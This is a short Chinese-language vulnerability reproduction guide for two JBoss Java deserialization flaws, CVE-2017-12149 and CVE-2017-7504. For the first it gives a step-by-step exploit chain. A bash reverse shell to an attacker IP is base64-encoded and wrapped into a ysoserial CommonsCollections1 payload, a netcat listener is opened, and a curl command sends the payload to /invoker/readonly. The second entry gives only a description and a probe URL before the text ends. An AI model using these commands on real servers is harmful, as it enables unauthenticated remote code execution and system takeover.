#漏洞1 jboss 反序列化命令执行漏洞 （CVE-2017-12149）

漏洞简介：
JBoss Application Server 反序列化命令执行漏洞（CVE-2017-12149），远程攻击者利用漏洞可以在未经过任何身份验证的服务器主机上执行任意代码。漏洞为高。该漏洞为java反序列化错误类型，存在于jboss的HttpInvoker组件中的ReadOnlyAccessFilter过滤器没有经过任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。

影响范围：
JBoss 5.x
JBoss 6.x

漏洞复现：
1. 访问ip:port/invoker/readonly。返回状态码为500的报错页面，则证明漏洞存在

2. 正常的bash会被分割，如” bash -i >& /dev/tcp/Attack_ip/Attack_port 0>&1” 会被分割成一个一个单词。所以我们对上边的内容进行base64编码。

3. 然后生成poc代码：
java  -jar  ysoserial.jar  CommonsCollections1 "bash -c {echo,base64编码后的内容}|{base64,-d}|{bash,-i}" > poc.ser

4. 本地监听，nc -lvp 8888

5. 执行poc即可获取shell
curl http://ip:port/invoker/readonly --data-binary @poc.ser

#漏洞2 JBossMQ JM 反序列化漏洞 （CVE-2017-7504）

漏洞介绍：
Red Hat JBoss Application Server（AS，也称WildFly）是美国红帽（Red Hat）公司的一款基于JavaEE的开源的应用服务器，它具有启动超快、轻量、模块化设计、热部署和并行部署、简洁管理、域管理及第一类元件等特性。Jboss AS 4.x及之前版本中,JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞,远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。

影响版本：
4.x及以下

漏洞复现：
1. 访问下边页面
http://ip:port/jbossmq-httpil/HTTPServerILServlet
如果出现则代表存在漏洞



